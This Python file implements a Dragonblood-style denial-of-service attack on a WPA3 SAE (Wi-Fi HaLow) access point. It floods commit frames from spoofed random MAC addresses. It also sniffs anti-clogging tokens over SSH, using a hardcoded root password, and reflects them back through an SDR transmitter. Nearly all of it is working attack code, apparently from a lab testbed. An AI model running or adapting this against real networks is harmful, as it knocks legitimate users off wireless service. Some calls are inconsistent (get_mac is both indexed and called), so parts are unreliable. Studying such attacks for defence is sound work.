import utils
import random
import time
from SDRtransmitTCP import transmitData
from attack.frames.sae_commit_frame import commit_frame
import threading
import subprocess
import sys
import os
import signal

time_filter = f'frame.time >= "{time.time()}""'
pcap = None

stop_track = threading.Event()

def _track_cookie():
    global tshark

    # set to its own core for parallel execution allowing for full concurrency
    try:
        os.sched_setaffinity(0, {2})
    except:
        print("could not set to own core, check if more cores are available to be used")
        return

    cmd = f"""
    sshpass -p 'halow' ssh \
    root@10.42.0.1 \
    "tcpdump --immediate-mode -nn -l -i morse0 'type mgt and subtype auth and wlan addr2 {utils.get_mac["TrustedAP"][0]}' -U -s0 -w - 2>/dev/null" |
    tshark -l -r - -Y "wlan.fixed.anti_clogging_token" \
    -T fields \
    -e wlan.sa \
    -e wlan.da \
    -e wlan.fixed.anti_clogging_token\
    """
    try:
        #run subprocess to open pipeline
        tshark = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            bufsize = 0,
            universal_newlines=True,
            start_new_session=True
        )
        stdout = tshark.stdout
        
        # loop through until told to stop by main thread
        while not stop_track.is_set():
            # block until line is read
            output = stdout.readline()
            if not output:
                continue
            
            #retrieve ap mac, rand mac, and cookie
            ap_mac, rand_mac, cookie = output.strip().split("\t")
            cookie_b = bytes.fromhex(cookie.replace(":", ""))

            #only transmit if mac and cookie is not none
            if rand_mac is not None and cookie is not None:
                frame_bytes = commit_frame(target_mac=ap_mac, src_mac=rand_mac, cookie=cookie_b, status=pwe)
                transmitData(frame_bytes)
    except:
        if tshark is not None:
            #terminate subprocesses
            tshark.terminate()

def random_mac():
    """
    Generate a random spoofed client MAC.
    
    return: random string of mac addresses
    """
    first = (random.randint(0, 255) | 0x02) & ~0x01  # local + unicast
    rest = [random.randint(0, 255) for _ in range(5)]
    return ':'.join(f'{b:02x}' for b in [first] + rest)

def flood_sae_commits(ap_mac:str, duration:int=600, rate:float=4, mac_no:int=10):
    """
    Send 'count' SAE commit frames from random STA MACs to the given AP MAC.
    Each frame forces the AP to run hash-to-curve (expensive ECC operation).
    """

    print(f"[*] Flooding {ap_mac} at a rate of {rate} SAE commit frames per second with {mac_no} spoof frames")
    start_time = time.time()
    frame_bytes = None
    random_macs = [random_mac() for _ in range(mac_no)]
    i = 0
    
    #run designated execution time
    while time.time() - start_time < duration:
        #iterate through macs reset when limit is reached
        src = random_macs[i]
        i += 1
        if i == len(random_macs):
            i = 0

        # construct and transmit frames
        frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src,cookie=None, status=pwe)
        transmitData(frame_bytes)
        time.sleep(1/rate)
        
    return int(duration/60), rate, mac_no

def start_dos(params):
    if len(params) < 4:
        print("Invalid number of parameters for Dragonblood DoS attack.")
        return
    
    # set global used by the token relfection
    global pwe
    pwe = int(params[0])
    ap_mac = utils.get_mac("TrustedAP")[0]

    # create thread
    threading.Thread(target=_track_cookie,daemon=True).start()
    time.sleep(1)
    og_interval = sys.getswitchinterval()
    sys.setswitchinterval(0.0005)
    stop_track.clear()
    try:
        flood_sae_commits(ap_mac=ap_mac, duration=int(params[1]), rate=float(params[2]), mac_no=int(params[3]))

    finally:
        # Set back original state
        stop_track.set()
        sys.setswitchinterval(og_interval)

        #terminate subprocess
        if 'tshark' in globals() and tshark is not None:
            try:
                # terminate process
                os.killpg(os.getpgid(tshark.pid), signal.SIGTERM)
                tshark.communicate(timeout=3)
            except subprocess.TimeoutExpired:
                try:
                    # force kill
                    os.killpg(os.getpgid(tshark.pid), signal.SIGKILL)
                    tshark.communicate()
                except Exception:
                    pass
            # process is gone
            except (ProcessLookupError, OSError):
                pass
            except Exception:
                pass


